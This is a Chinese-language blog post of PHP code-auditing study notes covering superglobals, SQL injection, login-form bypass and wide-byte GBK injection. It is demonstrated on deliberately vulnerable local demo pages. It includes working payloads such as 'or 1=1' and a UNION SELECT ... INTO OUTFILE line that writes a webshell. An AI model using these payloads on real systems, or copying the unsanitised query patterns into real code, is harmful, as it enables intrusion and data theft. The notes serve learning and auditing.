<h1 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">代码调试小技巧</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">最简单的输出调试方法，一般用来输出变量值或者不确定执行到哪个分支。</span><br><span class="line"></span><br><span class="line">print_r（true为1，false为空）,var_dump,debug_zval_dump</span><br><span class="line">这个主要是输出变量的数据值，特别是数组和对象数据，一般我们在查看接口的返回值或者不确定的变量，都可以使用这个api，debug_zval_dump输出结果和var_dump类似，唯一增加的一个值是refcount，记录一个变量被引用了多少次</span><br><span class="line"></span><br><span class="line">debug_print_backtrace</span><br><span class="line">可以查看输出的调用栈信息</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line">停止程序，无法运行后面代码</span><br></pre></td></tr></table></figure>

<h1 id="审计中涉及的超全局变量"><a href="#审计中涉及的超全局变量" class="headerlink" title="审计中涉及的超全局变量"></a>审计中涉及的超全局变量</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">全局变量：全局变量就是在函数外面定义的变量。不能在函数中直接使用。因为他的作用域不会到函数内部。所以在函数内部使用的时候常常看到类似global$a;</span><br><span class="line">超全局变量：超全局变量作用域在所有脚本都有效。注意，除了$_GET,$_POST,$_SERVER,$_COOKIE等之外的超全局变量保存在$GLOBALS数组中。</span><br></pre></td></tr></table></figure>

<h2 id="GLOBALOS"><a href="#GLOBALOS" class="headerlink" title="$GLOBALOS"></a>$GLOBALOS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="number">456</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>以上代码输出的是123</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="variable">$name</span> = <span class="number">456</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>这样就是输出的456，其中global起的是一个参数传递的作用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[name] = <span class="number">4567</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>输出4567，变量的作用域设置的全局</p>
<h2 id="POST-和-GET"><a href="#POST-和-GET" class="headerlink" title="$_POST 和 $_GET"></a><code>$_POST</code> 和 <code>$_GET</code></h2><p>post是向服务器传送数据。将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址，用户看不到这个过程。</p>
<p>get是从服务器上获取数据，把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到</p>
<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>request可以接受get和post的数据，但是比较慢，所以我们尽量不要使用request</p>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>这种超全局变量保存关于报头，路径和脚本位置的信息等。</p>
<p>我整理了其中的参数，也方便以后查阅</p>
<p>可以var_dump下来看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] #当前正在执行脚本的文件名，与 document root相关。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;argv&#x27;] #传递给该脚本的参数。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;argc&#x27;] #包含传递给程序的命令行参数的个数（如果运行在命令行模式）。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;GATEWAY_INTERFACE&#x27;] #服务器使用的 CGI 规范的版本。例如，“CGI/1.1”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_NAME&#x27;] #当前运行脚本所在服务器主机的名称。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_SOFTWARE&#x27;] #服务器标识的字串，在响应请求时的头部中给出。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_PROTOCOL&#x27;] #请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REQUEST_METHOD&#x27;] #访问页面时的请求方法。例如：“GET”、“HEAD”，“POST”，“PUT”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] #查询(query)的字符串。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] #当前运行脚本所在的文档根目录。在服务器配置文件中定义。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT&#x27;] #当前请求的 Accept: 头部的内容。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_CHARSET&#x27;] #当前请求的 Accept-Charset: 头部的内容。例如：“iso-8859-1,*,utf-8”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;] #当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;]#当前请求的 Accept-Language: 头部的内容。例如：“en”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_CONNECTION&#x27;] #当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_HOST&#x27;] #当前请求的 Host: 头部的内容。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_REFERER&#x27;] #链接到当前页面的前一页面的 URL 地址。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_USER_AGENT&#x27;] #当前请求的 User_Agent: 头部的内容。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTPS&#x27;] — 如果通过https访问,则被设为一个非空的值(on)，否则返回off</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;] #正在浏览当前页面用户的 IP 地址。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REMOTE_HOST&#x27;] #正在浏览当前页面用户的主机名。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REMOTE_PORT&#x27;] #用户连接到服务器时所使用的端口。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SCRIPT_FILENAME&#x27;] #当前执行脚本的绝对路径名。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_ADMIN&#x27;] #管理员信息</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_PORT&#x27;] #服务器所使用的端口</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_SIGNATURE&#x27;] #包含服务器版本和虚拟主机名的字符串。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;PATH_TRANSLATED&#x27;] #当前脚本所在文件系统（不是文档根目录）的基本路径。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] #包含当前脚本的路径。这在页面需要指向自己时非常有用。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] #访问此页面所需的 URI。例如，“/index.html”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;PHP_AUTH_USER&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;PHP_AUTH_PW&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;AUTH_TYPE&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。</span><br></pre></td></tr></table></figure>

<h2 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下: </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD_ERR_OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line">UPLOAD_ERR_INI_SIZE </span><br><span class="line">值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 </span><br><span class="line">UPLOAD_ERR_FORM_SIZE </span><br><span class="line">值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 </span><br><span class="line">UPLOAD_ERR_PARTIAL </span><br><span class="line">值：3; 文件只有部分被上传。 </span><br><span class="line">UPLOAD_ERR_NO_FILE </span><br><span class="line">值：4; 没有文件被上传。 </span><br><span class="line">值：5; 上传文件大小为0. </span><br></pre></td></tr></table></figure>

<h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><p>通过HTTPCookies方式传递给当前脚本的变量的数组</p>
<p>$HTTP_COOKIE_VARS和$_COOKIE是不同的变量，PHP处理他们的方式不同</p>
<p>$HTTP_COOKIE_VARS包含相同的信息（4.1.0已废弃）但它不是一个超全局变量</p>
<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><p>是一个数值，其中的value值可以我们设置，类似cookie</p>
<h2 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h2><p>$_ENV包含服务器端环境变量的数组，可在PHP程序的任何地方直接访问</p>
<p>$_ENV只是被动的接收服务器端的环境碧昂量转换为数组元素。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>数字型的注入，当输入的参数是整型时，则可认为是数字型注入。如年龄，id，页码，都可以是，而且不需要单引号进行闭合。</p>
<p>首先我们自己新建一个数据库来进行一个测试</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220826202223548.png" alt="image-20220826202223548"></p>
<p>这是一个名为test的数据库,以及一个user表</p>
<p>随后自己写一个查询页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);<span class="comment">#建立一个连接，返回一个连接标识</span></span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>,<span class="variable">$conn</span>);<span class="comment">#选择数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM USER WHERE id =<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());<span class="comment">#执行一次sql查询</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>)<span class="comment">#返回一个关联数组)&#123;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ID&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;USERNAME&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PASSWORD&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PHONE&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220826205026879.png" alt="image-20220826205026879"></p>
<p>可以看到就像是一个基础的sql注入靶场</p>
<p>or1=1就可以看到注入成功</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220826205517820.png" alt="image-20220826205517820"></p>
<h2 id="注入利用的方式"><a href="#注入利用的方式" class="headerlink" title="注入利用的方式"></a>注入利用的方式</h2><p>查询数据，读写文件，执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入webshell</span><br><span class="line">union select 1,2,3,十六进制编码的一句话 into outfile &#x27;C:/Localhost/WWW/3.php&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="登录处注入的例子"><a href="#登录处注入的例子" class="headerlink" title="登录处注入的例子"></a>登录处注入的例子</h2><p><code>login.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击登录&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>login.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;fail&#x27;</span>;<span class="comment">#首先看是否有数据从那边传过来</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);<span class="comment">#连接数据库</span></span><br><span class="line">    mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$conn</span>);<span class="comment">#选择数据库</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT *FROM USER WHERE USERNAME=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;<span class="comment">#拼接sql语句</span></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;执行失败&#x27;</span>.mysql_errno());<span class="comment">#执行sql语句</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="variable">$db_username</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$db_password</span> = <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;<span class="comment">#拿到数据库的结果整理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db_password</span> == <span class="variable">$password</span> &amp;&amp; <span class="variable">$db_username</span> = <span class="variable">$username</span>)&#123;<span class="comment">#对比数据</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;成功&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的用户名就存在万能密码注入，<code>or 1=1</code></p>
<h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827131024547.png" alt="image-20220827131024547"></p>
<h1 id="宽字节注入和二次注入"><a href="#宽字节注入和二次注入" class="headerlink" title="宽字节注入和二次注入"></a>宽字节注入和二次注入</h1><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>intval()#是强制转换类型，强制将其中的内容转换成整型。常用于数字型</p>
<p>add#函数在指定的预定义<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913">字符</a>前添加<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%8D%E6%96%9C%E6%9D%A0/10132050">反斜杠</a>。这些字符是单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</p>
<p>而宽字节注入的思路就是，单引号逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">因为%df的关系，\的编码%5c被吃掉了，也就失去了转义的效果，直接被带入到mysql中，然后mysql在解读时无视了%a0%5c形成的新字节，那么单引号便重新发挥了效果</span><br><span class="line"></span><br><span class="line">常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</span><br><span class="line"></span><br><span class="line">如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827133732973.png" alt="image-20220827133732973"></p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>test.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1:3306&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>,<span class="variable">$conn</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;GBK&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ID&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;USERNAME&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PASSWORD&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PHONE&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827135455087.png" alt="image-20220827135455087"></p>
